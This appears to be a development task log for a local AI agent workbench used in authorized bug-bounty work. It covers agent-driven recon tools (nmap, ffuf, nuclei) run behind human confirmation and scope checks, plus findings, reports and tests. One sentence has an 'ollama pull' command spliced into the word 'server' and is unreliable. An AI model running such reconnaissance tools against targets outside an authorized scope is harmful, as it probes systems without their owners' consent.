      "Starting…" with no visible output on a long generation). Verified via curl (raw NDJSON) and
      browser: plain-answer tasks, and the tool-call → confirm → resume path, both stream live and
      settle cleanly into the transcript with no duplication.
- [x] Add a "project" concept, scoped to tool execution history and Orchestrator tasks (chat stays
      a single global `sessionStorage` thread, unchanged — deliberately out of scope, see
      DEVELOPMENT.md's "Projects" section). Done: `services/projectManager.ts` (CRUD) +
      `services/projectStore.ts` (generic per-project JSON persistence) back `GET/POST/PATCH/DELETE
      /api/projects*`; `ExecutionRecord`/`OrchestratorTask` both gained `projectId`, every
      list/request/create endpoint now requires it (400 if missing), and both
      `toolManager.ts`/`orchestrator.ts` write-through to `backend/data/projects/<id>/*.json` on
      every mutation and hydrate from disk at seollama pull nomic-embed-textrver startup — history survives a restart. Frontend:
      new `ProjectPanel` (create/select/delete, inline two-step delete instead of a native
      `confirm()`) drives `useTools`/`useOrchestratorTask` via a `projectId`; starting a task is
      gated on both an agent and a project being selected, and the panel locks while a task is
      active so switching projects mid-task can't strand the confirm UI. Verified via curl
      (isolation between two projects, 400s on missing `projectId`, a backend restart preserving
      history) and in-browser (create/select/delete, scoped Tool Registry history, a full
      tool-call-and-resume task run inside a project). `backend/data/projects/*` is gitignored
      (with `.gitkeep`) since project notes may contain sensitive target/scope info, unlike the
      shipped `backend/data/agents/*.json` configs.

## Polish / hardening

- [x] Add automated tests — first pass, backend service-level unit tests (Vitest). Covers the
      exact gaps `DEVELOPMENT.md` had been flagging: `orchestrator.ts`'s state machine + the
      `parseToolRequest` fence/JSON-extraction logic (now exported for direct testing),
      `toolExecutor.ts`'s timeout/cancellation/truncation behavior (real subprocesses via
      `process.execPath`, no mocking), `toolManager.ts`'s validation/path-containment/confirm-
      reject-cancel lifecycle, `agentManager.ts`'s config loading + online/offline status,
      `chatService.ts`'s system-prompt/options assembly, and `projectManager.ts`/`projectStore.ts`'s
      CRUD + persistence. 81 tests across 6 files (`npm test` in `backend/`), all mocking done via a
      small shared in-memory `node:fs/promises` double (`backend/src/test-utils/fakeFs.ts`) rather
      than a new dependency or refactoring source just for testability. Sanity-checked by
      temporarily breaking two source lines and confirming the matching tests actually fail (see
      DEVELOPMENT.md's "Automated tests" section). Deliberately deferred: frontend hook tests and
      HTTP route-level (`supertest`) tests — see that same section for why.
- [x] Improve the dev-mode "backend unreachable" error message. Confirmed via curl that Vite's
      proxy actually returns an empty-bodied `502` (not literal HTML as originally guessed) when
      nothing's listening on :3001 — `res.json()` on that empty body throws, so
      `httpClient.ts#throwForErrorResponse`'s existing `status >= 500` fallback was already the
      right code path, just under-specific. It now reads "Could not reach the backend server. Is
      it running? Start it with `./start.sh` (or `cd backend && npm run dev`)." — matching the
      specificity of the existing Ollama-down message. Verified live: ran the frontend alone (no
      backend) and confirmed the new message renders in both the Model and Agents sidebar panels.
- [x] Add schema validation feedback for malformed `backend/data/agents/*.json` files. Done:
      `agentManager.ts#readAgentConfigs` now also returns a list of `{file, reason}` warnings
      (invalid JSON / missing-or-malformed fields / duplicate id) alongside the loaded agents,
      exposed via a new `getAgentConfigWarnings()` and threaded onto both `GET /api/agents` and
      `POST /api/agents/reload`'s existing response payloads (`console.warn` logging kept too, not
      replaced). Frontend: `AgentList` renders a small amber warning box above the agent list when
      any exist, naming each bad file and why. Verified live: dropped in a file with invalid JSON
      and one with a duplicate id, saw both listed with the right reasons; fixed and reloaded, the
      banner cleared. Added backend test coverage (`agentManager.test.ts`) for each warning
      reason and for stale warnings clearing on a subsequent successful reload.
- [x] Redesign the frontend into a premium "AI operating system" desktop UI (dark charcoal +
      emerald, glass panels, glow borders, animation) per an explicit design spec — visual/UX only,
      no backend or `hooks`/`services`/`types` changes. New 3-column shell (`components/layout/`:
      `AppShell`/`Sidebar`/`TopBar`/`RightPanel`/`CommandPalette`), a shared `components/ui/`
      primitive set (`GlassPanel`/`StatusPill`/`Button`/`Collapsible`/`Sheet`/`ProgressRing`), a
      frontend-only emoji→Lucide icon map (`lib/icons.ts`) so agent/tool configs stay untouched, and
      a real dark/light theme toggle (`hooks/useTheme.ts`). Every existing view (Chat, Workbench,
      Plans, Projects, Settings) was reskinned onto this system; Chat's empty state became an
      animated agent-network "Command Center" built from real agent data. Deliberately did not add
      Risk Score/Coverage/heatmap-style widgets (no backend data source) or Reports/Plugins nav
      entries (those backend systems are still unbuilt placeholders). Verified live in-browser
      against real Ollama + real tools: agent selection, chat send/receive, a full Workbench
      tool-confirmation round trip, the Plans builder, the Settings sheet, and the theme toggle. See
      DEVELOPMENT.md's "Premium UI/UX Redesign" section, including a non-obvious finding about
      framer-motion animations freezing in backgrounded browser-automation tabs (not an app bug).
- [x] Close the redesign's plan gaps (loading skeletons, animated view-switch transitions) and do a
      general rough-edges pass (keyboard focus rings, an empty-state gap in `ToolRegistry`). Notably,
      the view-transition work initially used `AnimatePresence mode="wait"`, which browser-automation
      testing showed makes navigation *appear* stuck if an exit animation never completes (it can, in
      a backgrounded tab — see DEVELOPMENT.md's redesign section) — switched to `mode="popLayout"`
      so the new view always mounts immediately regardless of animation state. See DEVELOPMENT.md's
      "Polish pass" subsection.
- [x] `start.sh` kills anything matching the dev-server process patterns before launching — revisit
      if this ever needs to coexist with other projects' dev servers on the same machine. Done:
      switched from guessing at command-line patterns to PID-file tracking. Each service now
      launches via `setsid`, making it and every descendant (including tsx watch's grandchild
      process, the exact thing that used to survive a plain kill) the leader of one process group;
      the PID is written to `.backend.pid`/`.frontend.pid` (gitignored) and the next run kills the
      whole group by PID, not by pattern. Old path-scoped `pkill -f` patterns kept as a fallback
      sweep for pre-existing stragglers. Verified live: reproduced the exact orphaned-grandchild
      state, confirmed one run's fallback sweep replaced it, then confirmed a second run's cleanup
      killed the *first* run's full tree via the PID-file path alone. See DEVELOPMENT.md's
      "start.sh: PID-tracked process cleanup" section.
- [x] The redesign's Workbench `ExecutionConsole` got Copy + Export (download output as `.txt`) but
      deliberately not Search/Bookmark across execution history (from the original design spec's
      Terminal section) — would need real state design (indexing/persisting across runs)
      disproportionate to a visual pass. Done: new `ExecutionHistoryPanel.tsx` (search across tool
      id/command/output, expandable rows reusing `ExecutionConsole`) in the Workbench Home tab,
      frontend-only — no backend change needed since `GET /api/tools/executions` already returns
      everything searched. Bookmarks are a new `hooks/useBookmarks.ts`, `localStorage`-backed (a
      personal preference, not project data). Verified live against two real tool executions
      (search narrowing correctly, bookmark toggle + persistence, bookmarked-only filter, row
      expansion). See DEVELOPMENT.md's "Execution history search + bookmarks" section.
- [x] Frontend hook/component tests. Done: Vitest + React Testing Library + `@testing-library/
      user-event` + `jsdom`, 128 tests across 18 files (`cd frontend && npm test`) — every hook
      (`useSettings`, `useTheme`, `useBookmarks`, `useModels`/`useAgents`/`useProjects`/`useTools`/
      `useRag`, `useChat`, `useSessions`, `useOrchestratorTask`, `useMultiAgentPlan`) plus six
      components with real interaction logic (`PromptInput`, `ModelSelector`, `AgentList`,
      `ProjectPanel`'s two-step delete, `ChatMessageView`'s role/tool-call rendering, `ui/
      Collapsible`). Sanity-checked by breaking `useTheme`'s toggle and `ProjectPanel`'s delete
      confirmation and confirming the matching tests actually fail. See DEVELOPMENT.md's "Frontend
      hook/component tests" section, including a Node 22+ `--localstorage-file` gotcha that broke
      every storage-hook test until worked around.
- [x] Orchestrator task continuation. User-reported: completing a Workbench task (e.g. the Recon
      Agent) left no way to keep going except starting a brand-new task with no memory of the prior
      conversation. Done: `services/orchestrator.ts#continueTask` appends a follow-up user message
      to an already-`completed` task and re-advances the same loop (same task id, same message
      history, same tool budget already spent) — can itself trigger another tool call, landing back
      in `waiting_confirmation` exactly like the original run. New `POST /api/orchestrator/tasks/
      :id/continue`; frontend gained `useOrchestratorTask#continueTask` and a small follow-up input
      in `OrchestratorTaskView` (Workbench only, not the multi-agent Planner's per-step view). 6 new
      backend tests (129 total), 4 new frontend hook tests (132 total). Verified live via curl and
      in-browser against a real Recon Agent task — the same tab kept the same task, no duplicate
      ever appeared. See DEVELOPMENT.md's "Orchestrator task continuation" section.
- [x] Fixed: cancelling a `waiting_confirmation` task left its execution stuck at
      `pending_confirmation` forever (permanent "Awaiting confirmation" pill in Tool Registry/
      Execution History for a task that no longer existed). Root cause: `cancelExecution` only
      works on an execution that's actually running; `cancelTask` called it unconditionally and
      silently swallowed the throw. Done: `cancelTask` now calls `rejectExecution` for a still-
      `pending_confirmation` execution, `cancelExecution` only for one already running. 4 new/
      rewritten backend tests (130 total). Verified live via curl (execution correctly flips to
      `rejected`) and found direct evidence of the original bug already sitting in the real
      `nexus.htb` project data from before the fix. See DEVELOPMENT.md's "Cancelling a
      waiting_confirmation task left the execution stuck forever" section.
- [x] Fixed: task sessions (Workbench) could only have one open per agent — starting a new task
      for an agent that already had a session open (even a finished one) just refocused the old
      tab and silently discarded the newly-typed objective, no error shown. Done:
      `useSessions.ts#openTaskSession` no longer dedups — every "Start Task" opens a genuinely new
      session, so e.g. the Recon Agent can run `nmap` in one tab and `ffuf` in another
      concurrently. Chat sessions unchanged (still one per agent — not what was asked). Tab/node
      labels now include the objective so same-agent task tabs stay distinguishable. 1 new
      frontend test (133 total). Verified live: two concurrent Recon Agent task tabs, cancelling
      one left the other untouched. See DEVELOPMENT.md's "Concurrent task sessions per agent"
      section.
- [x] Human-in-the-loop tool failure recovery. User-reported: when a tool fails (missing/disabled/
      invalid, or ran and errored/timed out), the agent just silently retried or gave up with zero
      chance to intervene - the user wanted to be able to make a suggestion (e.g. "that tool isn't
      installed, use X instead"). Done: new `TaskStatus`/`MultiAgentPlanStatus` value
      `waiting_guidance` - both a failed tool *request* (previously an immediate silent retry) and
      a confirmed execution that *ran* and failed/was cancelled (previously an immediate silent
      auto-continue) now pause there instead. New `services/orchestrator.ts#provideGuidance(id,
      note?)` appends an optional human note before re-advancing; multi-agent plans got the same
      status taught to `multiAgentOrchestrator.ts#continueAfterStepTask` (a real regression -
      misclassifying a paused step as a failed plan - caught by tests before shipping) plus
      `provideStepGuidance`. New routes `POST /api/orchestrator/tasks/:id/guidance` and
      `POST /api/plans/:id/guidance`. Frontend: a `GuidanceInput` card in `OrchestratorTaskView`
      (optional textarea + Continue), wired into both the Workbench and the Planner. A successful
      execution or an explicit reject still auto-continue exactly as before - zero added friction
      on the common path. 15 new backend tests (145 total), 8 new frontend hook tests (141 total).
      Verified live end-to-end (curl and in-browser): asked the Recon Agent to use `amass`
      (not installed) - it paused instead of silently retrying; a guidance note suggesting
      `subfinder` got tried next (also not installed, paused again correctly rather than looping);
      a final note asking for a plain-text answer brought the task to `Completed`. See
      DEVELOPMENT.md's "Human-in-the-loop tool failure recovery (waiting_guidance)" section.
- [x] Per-agent model override + parallel agent sessions. Every agent was previously locked to one
      hardcoded model, and only one agent could be "doing something" at a time (Chat: one global
      session; Workbench: one global active task) even though the backend already ran tasks
      independently. Done: `chatService.ts`/`orchestrator.ts` accept an optional per-request/per-task
      `model` override (agent config never mutated, offline-gate skipped when overriding); new
      `hooks/useSessions.ts` (chat and task sessions, one per agent per kind, tab-focus tracked per
      view) backs a tab strip in both Chat and Workbench (`components/layout/SessionTabs.tsx`) —
      each open session is its own mounted `ChatSessionPanel`/`TaskSessionPanel` so a background
      session keeps genuinely running/streaming while another tab is focused, with no rewrite of
      `useChat`/`useOrchestratorTask` needed. `AgentNetwork`'s map now grows a node + connector line
      per open session live. A compact per-session model `<select>` (Chat) and a model picker next
      to the New Task agent picker (Workbench) let the override actually be changed, not just
      defaulted. Verified via a `window.fetch` patch that an overridden model actually reaches the
      request, and live that two concurrent chat sessions and a background Workbench task all stay
      correctly isolated. 6 new backend tests (105 total). See DEVELOPMENT.md's "Per-agent model
      override + parallel agent sessions" section.
- [x] Fixed: switching the top-level nav (Chat/Workbench/Plans/Findings) fully unmounted whichever
      view you left - `App.tsx` conditionally rendered only the active view inside a
      `motion.div key={activeView}`, so e.g. leaving Workbench destroyed every open
      `TaskSessionPanel`'s `useOrchestratorTask` state (task/liveOutput/streamingText - plain React
      state, no persistence) and orphaned any in-flight `useChat` stream in Chat (its `setState`
      calls landed on a dead component, silently losing the rest of a streaming reply). Done:
      each view now mounts once on first visit and stays mounted forever after, toggled via a
      `hidden` CSS class instead of conditional render + remount - the same "mount once, hide via
      CSS" pattern `SessionTabs`/`TaskSessionPanel`/`ChatSessionPanel` already use for session tabs
      within a view, just applied one level up. Dropped the `AnimatePresence`/`framer-motion`
      view-switch fade in favor of correctness (matches the zero-animation tab-switch already used
      everywhere else in the app). Verified live: started a Recon Agent task, approved it to
      `waiting_confirmation`, switched Workbench → Chat → Findings → Workbench, and the exact same
      confirm card (objective, tool-call bubble, Approve/Reject) was still there byte-for-byte -
      previously this would have reset to a blank "Starting…"/New Task view. See DEVELOPMENT.md's
      "Persistent top-level views (nav-switch state loss)" section.

## Later (once a real tool is wired up)

- [x] RAG (`types/rag.ts`, `extensions/retrievalRegistry.ts`). Done: `services/ragIndex.ts` walks
      `env.workspaceRoot`, chunks files (50 lines, 5-line overlap), embeds via a dedicated Ollama
      embedding model (`EMBEDDING_MODEL`, default `nomic-embed-text` — chat/coder models lack
      Ollama's `embedding` capability and are flatly rejected, confirmed live), and persists to
      `backend/data/rag/index.json`. New `GET/POST /api/rag/status|reindex`. Agents reach it via a
      new `search_knowledge_base` pseudo-tool in the Orchestrator's existing plain-JSON tool
      convention — read-only, so it deliberately skips the human-confirmation gate every real
      `ExecTool` requires. Frontend: `KnowledgeBasePanel` (status + Reindex) in the Workbench Home
      tab. 14 new backend tests (119 total). Verified live: reindex against the real workspace,
      and the exact `EmbeddingModelUnavailableError` message surfacing in the UI when the
      embedding model isn't pulled yet. Full end-to-end verification (a real folder + a real
      agent retrieving real code) is still blocked on the user providing a `WORKSPACE_ROOT` path
      and pulling an embedding model. See DEVELOPMENT.md's "RAG over a workspace codebase" section.
- [x] Security scanners (`types/scanner.ts`, `extensions/scannerRegistry.ts`). Done: "Scan
      Profiles" - a deterministic (non-agent) chained tool run, not the original in-process
      `Scanner.scan()` stub. Pick a target + a preset profile (Quick Recon, Subdomain Discovery,
      Web App Scan, Full Port Scan - `backend/src/scanners/builtins.ts`), preview every step's
      resolved command, then "Confirm & Run All" chains them sequentially through the existing
      `toolManager.ts` execution pipeline (`services/scanRunner.ts`) - one human confirmation for
      the whole profile up front (not per step, since a profile's tools/arguments are fixed, not
      chosen live by an LLM), Execution → Parser → Findings ingestion applies unchanged, and a
      failing step doesn't abort the rest. `GET /api/scanners` + project-scoped
      `GET/POST /api/projects/:projectId/scans[...]` (the create route streams NDJSON progress for
      the whole run). Frontend: `ScannerPanel.tsx` in the Workbench Home tab (profile+target picker
      → inline preview/confirm → live step progress/output → scan history). 11 new backend tests
      (220 total), 12 new frontend hook tests (182 total). Verified live via curl (a real Quick
      Recon run against `example.com` with one step genuinely failing and the scan still completing
      - proving failure isolation - plus a `nmap` Full Port Scan cancelled mid-flight) and
      in-browser through the real Workbench UI. See DEVELOPMENT.md's "Security scanners (Scan
      Profiles)" section, including a real duplicate-flag bug caught by live preview testing before
      it ever reached the browser.
- [x] Report generation. Done: generate a report from a **multi-finding selection** (checkbox-
      select rows in the Findings table, "Generate Report from N selected") - one agent call
      (Report Writer, `backend/data/agents/report-writer.json`) via `services/reportManager.ts`
      writes a single Markdown document (Executive Summary + one section per finding with Impact/
      Reproduction/Remediation), split into `ReportSection[]` by a lenient `## `-heading parser.
      Persisted per-project (`reports.json`, same pattern as executions/tasks/plans/scans) with a
      new "Reports" tab in Findings (list → full-document `Sheet` view → export to `.md` → two-step
      delete). `extensions/reportGenerator.ts` (confirmed dead in this session's audit above) was
      deleted outright, superseded by `services/reportManager.ts` - same "delete the stub, build
      the real thing in services/" pattern as `extensions/orchestrator.ts`. New project-scoped
      `GET/POST/DELETE /api/projects/:projectId/reports[...]`, `POST /` streams NDJSON
      (`chunk`/`report`/`error`) for a live-writing UX. 10 new backend tests (230 total), 21 new
      frontend tests (10 `useReports.test.ts` + FindingsTable selection coverage, 195 total).
      Verified live with a real local model (`qwen2.5-coder:7b`): two real findings (a critical
      SQLi + a low missing-CSP-header, both with genuine evidence) → a correctly-structured report
      grounded in that evidence, no fabrication observed - via curl and again in-browser end to end
      (select → title → stream → land on Reports tab → open full document → export → delete). See
      DEVELOPMENT.md's "Report generation" section.
- [ ] Plugin system (`types/plugin.ts`, `extensions/pluginRegistry.ts`)
- [x] Multi-agent orchestration. Done: a user-authored, ordered plan of `{agent, objective}` steps
      (≥2) runs sequentially, where each step is a *full* single-agent Orchestrator task
      (`services/orchestrator.ts`) — so a step can request tools and pause for the exact same
      Approve/Reject confirmation a standalone task uses — and each step's final answer is
      prepended (labeled by agent name) as context into the next step's objective, so e.g. Recon
      Agent → General Assistant actually chains real output, not just instructions in isolation.
      New `services/multiAgentOrchestrator.ts` (`createPlan`/`resumePlan`/`cancelPlan`), same
      pause/resume/persist pattern as the single-agent Orchestrator one level up, persisted per
      project to `multi-agent-plans.json`. `routes/plans.ts` streams create/resume as NDJSON and
      joins in the current step's live task server-side so the client needs only one fetch. This
      supersedes the `extensions/orchestrator.ts` placeholder (deleted — its call-and-return
      signature couldn't express "pause mid-plan for confirmation") and `types/orchestration.ts`
      (rewritten in place to the real shape). Frontend: extracted `OrchestratorTaskView.tsx` out of
      `OrchestratorWorkbench.tsx` (shared transcript/confirm-card rendering, real reuse since the
      new "Plans" tab needs the exact same view for its current step) and a new
      `MultiAgentPlanner.tsx` (step builder + run view with collapsible completed-step summaries).
      Verified via curl (context-chaining, pause-mid-plan-for-a-real-tool-confirmation via
      reject→resume, project isolation, restart persistence) and in-browser (a real Recon Agent →
      General Assistant plan, approving a live tool call mid-plan, watching it chain automatically
      into step 2 with the correct answer); also re-verified the single-agent Workbench tab is
      byte-for-byte unaffected by the `OrchestratorTaskView` extraction. 13 new backend tests
      (`multiAgentOrchestrator.test.ts`, mirroring `orchestrator.test.ts`'s mocking approach).
- [x] Real tool execution for recon (nmap, ffuf, nuclei, httpx, etc.) — done as the Tool Execution
      Framework above (`toolManager.ts`/`toolExecutor.ts`/`tools/exec/builtins.ts`), separate from
      the in-process `Tool`/`toolRegistry` used by the tool-calling round trip.
- [x] Project-scoped chat. Done: `ChatView.tsx` gained its own page-level "current project"
      selector (`ProjectPanel`, matching Workbench/Findings/Scanners/Reports each owning their
      own local selection). Chat sessions now dedup per **(agent, project)** pair instead of just
      per agent (`hooks/useSessions.ts#openChatSession`'s third, optional `projectId` param) - pick
      a project, open an agent, get that project's own thread with it; switch projects and reopen
      the same agent, get a genuinely separate thread; reopening the same (agent, project) pair
      resumes it instead of duplicating. Reuses the existing per-session `projectId` field (already
      built for opting a chat into tool use) rather than adding a parallel concept - a
      project-scoped thread now starts tool-enabled by design, not as a separate step. Session tabs
      and Command Center map tooltips disambiguate same-agent sessions by project name the same way
      task tabs already disambiguate by objective. 9 new frontend tests (5 in `useSessions.test.ts`,
      new `SessionTabs.test.tsx` for the label logic, 214 total). Verified live in-browser: two
      throwaway projects, opened Recon Agent under each - two genuinely separate, both tool-enabled
      tabs coexisted; reselecting the first project and reopening Recon Agent refocused the
      existing thread rather than creating a third. See DEVELOPMENT.md's "Project-scoped chat"
      section.
## New TODO (audited 2026-08-08)

Five feature requests, audited against the actual current codebase before any implementation - a
lot has been built since parts of this list were drafted, so several sub-items already exist
verbatim. Sub-items are individually checked; a task heading itself is only checked once every
sub-item under it is. Implementing gaps **one task at a time, in order** - only Task 1 has been
started/finished so far, the rest are audited but not yet touched.

### Task 1 — Tool Registry & Agent Tools

> Turn the existing tool execution engine into a complete Tool Registry UI. Implement: tool
> discovery from the backend; detect installed tools automatically; show tool name, version, path,
> description and status; enable/disable tools; tool categories (Recon, Network, Web, Fuzzing,
> Analysis, OS, Reporting); allow each AI agent to have its own allowed tools; agent configuration
> should read Agent.tools automatically; replace the current single tool checkbox with a proper
> multi-tool selector; show which tools an agent is currently allowed to use. Do not implement new
> security tools yet - focus on making the existing execution framework usable from the UI.

- [x] Tool discovery from the backend — `GET /api/tools` (`toolManager.ts#listExecToolsWithStatus`)
- [x] Detect installed tools automatically — `which`-based `resolveExecutablePath`,
      available/unavailable per tool
- [x] Show tool name, description, and status — `ToolRegistry.tsx`
- [x] Show tool version — `ExecTool.versionFlag` (a safe, per-tool "print version and exit" flag,
      deliberately omitted for `whois`/`nslookup` since an unrecognized flag risks a real network
      query on some implementations) probed via `spawnSync` with a 3s timeout in
      `toolManager.ts#resolveVersion`, surfaced as `ExecToolWithStatus.version`
- [x] Show tool path clearly — `ToolRegistry.tsx` now renders `resolvedPath ?? executable` as
      visible text (was tooltip-only before)
- [x] Enable/disable tools from the UI — `PATCH /api/tools/:id` (`toolManager.ts#setToolEnabled`),
      persisted to `backend/data/tools/overrides.json` and re-applied on startup
      (`loadToolOverridesFromDisk`, called from `index.ts`); toggle button in `ToolRegistry.tsx`
      (`Power` icon, wired through `useTools.ts#toggleTool`)
- [x] Tool categories: Recon / Network / Web / Fuzzing / Analysis / OS / Reporting —
      `ExecToolCategory` reworked to exactly these 7; every builtin tool remapped in
      `tools/exec/builtins.ts` (filesystem/git/bash/python → os, curl/http_request/httpx/katana →
      web, nmap/whois/dig/nslookup → network, ffuf → fuzzing, nuclei → analysis,
      subfinder/amass → recon). No tool is categorized "reporting" yet - none of the ~20 builtins
      fit it, and adding one would be a new security tool, out of scope per this task's own note.
- [x] Allow each agent to have its own allowed tools — `Agent.execTools?: string[]`, enforced in
      `orchestrator.ts` both in the tools preamble shown to the model and again at request time
- [x] Agent configuration reads the tool allowlist automatically — same field. Note: the request
      says "Agent.tools" specifically, but that field is the *other*, unused native-Ollama-tool-
      calling mechanism (`toolRegistry.ts`, zero tools registered) - `execTools` is the one that
      actually drives the real Tool Execution Framework this task is about. See `CLAUDE.md`'s "Two
      tool-calling mechanisms" section if this distinction matters for later tasks too.
- [x] Multi-tool selector replacing a single checkbox — `AgentEditor.tsx`'s "All tools" / "Select
      specific tools" toggle, grouped by category with live per-category selected/total counts
- [x] Show which tools an agent is currently allowed to use — same UI (also read-only-visible via
      the category counts when opening an existing agent for editing)

**Status: done (2026-08-08).** All sub-items implemented, typechecked, tested (backend
`toolManager.test.ts` +5 cases, frontend `useTools.test.ts` +1 case, 276/215 suites green), and
manually verified in the browser (version/path display, enable/disable toggle round-trip through
`GET /api/tools`, category grouping in `AgentEditor.tsx`).

### Task 2 — Autonomous Agent Execution Loop

> Upgrade the existing orchestrator so an agent can analyze the objective, decide whether a tool is
> required, select an allowed tool, generate arguments, request human confirmation, execute,
> receive the result, analyze it, decide the next action, and continue until the objective is
> complete. The agent must NOT simply respond with commands - it must actually execute approved
> tools through the existing ExecTool/toolManager system. Every execution must appear in the UI
> with: Agent, Tool, Command, Arguments, Status, Start time, Duration, Output, Confirmation state.
> Never bypass the existing human confirmation mechanism.

- [x] Full analyze → decide → select → generate args → confirm → execute → result → analyze →
      continue loop — this is exactly `services/orchestrator.ts`'s existing state machine
      (`running → waiting_confirmation → running → ... → completed/failed/...`), already built
- [x] Must actually execute approved tools, not just respond with commands — `requestExecution`/
      `confirmExecution` genuinely spawn the real OS process via `toolExecutor.ts`
- [x] Never bypass human confirmation — every `ExecTool` has `requiresConfirmation: true`; this was
      confirmed with the user as a hard design requirement before the Tool Execution Framework was
      ever built (see DEVELOPMENT.md)
- [x] Execution shows Tool/Command/Arguments/Status/Start time/Duration/Output/Confirmation state —
      all present on `ExecutionRecord` and rendered in `ExecutionConsole.tsx`/`ExecutionHistoryPanel.tsx`
- [x] Execution shows **Agent** — `ToolRequestBody.agentId`/`ExecutionRecord.agentId` (both
      optional - undefined for a manual, agent-less request), threaded from
      `orchestrator.ts#advance` (`task.agentId`) through `toolManager.ts#requestExecution`.
      `ExecutionHistoryPanel.tsx` resolves it to a name badge per row (via a new `agents` prop,
      same `agentName(agents, id)` lookup pattern already used by `OrchestratorWorkbench.tsx`/
      `MultiAgentPlanner.tsx`) and folds it into the row's search matching too.

**Status: done (2026-08-08).** Backend: 2 new tests in `toolManager.test.ts` (agentId carried
through for an agent-driven request, undefined for a manual one) plus 2 existing
`orchestrator.test.ts` assertions updated to expect the new field on `requestExecution`'s call
args. Frontend: `tsc -b`/`oxlint` clean, 277/215 tests green. Verified live: a `POST
/api/tools/request` with `agentId: "recon-agent"` round-tripped through `GET /api/tools/executions`
with the field intact, and the Workbench's Execution History panel rendered a "Recon Agent" badge
on that row while an older, agent-less manual execution right below it showed none.

### Task 3 — Bug Bounty Mission Workspace

> Create a proper Mission/Engagement system. A mission represents one authorized security
> assessment, with Name/Description/Scope/Out-of-scope targets/Rules/Start date/Status; an Assets
> inventory (domains, subdomains, IPs, URLs, ports, technologies, APIs); and an Activity log (agent
> actions, tool executions, commands, results, decisions, errors). Everything agents generate must
> belong to the active mission. Add a Mission selector to the main UI. When a mission is selected,
> the AI should receive the mission context. Do not allow an agent to execute against a target
> outside the mission scope. Make the Mission view the central place all work is organized.

- [x] Everything scoped to one project/"mission" — `projectId` already scopes tool executions,
      Orchestrator tasks, multi-agent plans, findings, scan runs, and reports (see `CLAUDE.md`'s
      "Projects" section)
- [x] A project/mission selector in the main UI — `ProjectPanel`, independently on every relevant
      view (Workbench, Findings, Chat)
- [x] Mission view as the central organizing place — arguably already true (Findings/Workbench/Chat
      all key off the selected project), though there's no single unified "Mission" screen combining
      scope+assets+activity+findings in one place the way the request describes
- [x] Structured mission fields (Description/Scope/Out-of-scope targets/Rules/Start date/Status) —
      `Project` gained `description?/scope?/outOfScope?/rules?/startDate?/status?`, all optional
      (existing `project.json` files with none of them keep working). Kept the "Project" name
      throughout rather than renaming to "Mission" (user's explicit choice - see DEVELOPMENT.md).
      Editable via a new `MissionEditor.tsx` sheet, opened from `ProjectPanel`'s per-card Edit
      (pencil) affordance.
- [x] Assets inventory — a new read-only `AssetsView.tsx`, derived entirely from existing Findings
      data (no new backend entity) - regroups findings by type into Domains/Subdomains/Ports/
      Technologies/APIs/Endpoints, deduplicated by canonical `value`. IP addresses have no
      dedicated `FindingType` (deliberately - see DEVELOPMENT.md) so they're recovered instead from
      any finding whose `target` happens to be IPv4-shaped.
- [x] Activity log — a new `ActivityFeed.tsx` + `useActivity.ts` hook, merging a project's tool
      executions and Orchestrator task transcripts (both already existed, just never combined) into
      one chronological feed. Frontend-only merge, no new backend entity.
- [x] AI receiving mission context automatically — `orchestrator.ts#buildToolsPreamble` (already had
      `projectId` in scope) now fetches the project and prepends a "Mission: ..." block
      (description/scope/out-of-scope/rules/status) to the tools preamble whenever any of those
      fields are set - omitted entirely for a project with none configured.
- [x] Scope enforcement — new `services/scopeMatcher.ts`, wired into
      `toolManager.ts#requestExecution`. Best-effort: since a tool request's `arguments` is an
      opaque `string[]` with no structured "target" concept, `extractTargets()` regex-extracts
      domain/IP/URL-looking tokens (filtered against a curated common-TLD allowlist to avoid
      matching dotted code identifiers like `process.stdout.write` or filenames like `app.py`).
      A clearly out-of-scope target throws `OutOfScopeError` (blocks outright, 403); when nothing
      target-shaped is found at all, the execution still proceeds but carries a new
      `ExecutionRecord.scopeWarning`, shown as an amber banner in `ExecutionConsole.tsx` before the
      human confirms. An empty/unset `scope` means no restriction (opt-in per mission).
- [x] Mission selector / central place — unchanged from the prior assessment (`ProjectPanel`
      already served this), now additionally the entry point to full mission editing.

**Status: done (2026-08-08).** 314 backend / 240 frontend tests (many new: `scopeMatcher.test.ts`,
`projectManager.test.ts` mission-field cases, `toolManager.test.ts` scope-enforcement cases,
`orchestrator.test.ts` mission-context-injection cases, `MissionEditor.test.tsx`,
`AssetsView.test.tsx`, `ActivityFeed.test.tsx`, `useActivity.test.ts`), both `tsc` checks and
`oxlint` clean. Verified live end-to-end on a real project: set scope via the Mission editor in the
browser, then confirmed via direct API calls that a request against an out-of-scope target was
blocked (`OUT_OF_SCOPE`) while an in-scope one succeeded: Assets/Activity tabs verified in the
browser against real historical data.

**Deliberately scoped down from the original ask** (see DEVELOPMENT.md for the full rationale):
Assets/Activity are derived views, not new backend entities; scope enforcement is best-effort for
freeform tool calls (Scan Profiles' explicit `target` field gets a definitive check for free,
since it's just another argv token to the same enforcement path); "Project" was kept as the
UI/technical term rather than renaming to "Mission" throughout.

### Task 4 — Findings & Evidence System

> Create a proper vulnerability management system. Agents must be able to create findings instead
> of only writing text. Finding fields: ID, Title, Severity, Confidence, Asset, URL, Endpoint,
> Parameter, Description, Impact, Reproduction steps, Evidence, Related tool executions, Related
> agents, Status, Created time. Statuses: Potential, Investigating, Confirmed, False Positive,
> Reported, Duplicate. Create an Evidence system (HTTP requests/responses, terminal output,
> screenshots, files, tool results, agent reasoning summaries). Every finding should link back to
> the exact execution and evidence that produced it. Add a Findings dashboard filterable by
> Severity, Confidence, Asset, Agent, Status.

- [x] Structured findings, not just text — the whole Findings Engine (`findingsManager.ts`,
      `types/finding.ts`), auto-parsed from tool output via per-tool parsers
- [x] ID/Title/Severity/Description/Evidence/Status/Created time — all present on `Finding`
- [x] Confidence — present (`Finding.confidence`, 0-1), just not currently a table filter (see below)
- [x] Findings dashboard with filtering — `FindingsView.tsx`/`FindingsTable.tsx`, filters by
      severity/type/tool/target/tag/search
- [x] Filter by **Confidence** — `FindingsView.tsx` gained an "Any confidence" dropdown (≥50/70/90%
      presets), backed by `FindingFilters.minConfidence` server-side
- [x] Filter by **Agent** specifically — new dropdown (only rendered when the project actually has
      agent-touched findings), matching `Finding.tool` (agent-sourced) or `relatedAgents`
- [x] `Parameter` field — `Finding.parameter?: string`, editable in `FindingDetails.tsx`'s new
      Details form
- [x] `Impact` field — `Finding.impact?: string`, same Details form; distinct from `description` now
- [x] `Reproduction steps` field — `Finding.reproductionSteps?: string`, same Details form
- [x] Status vocabulary — `FindingStatus` renamed wholesale to `potential`/`investigating`/
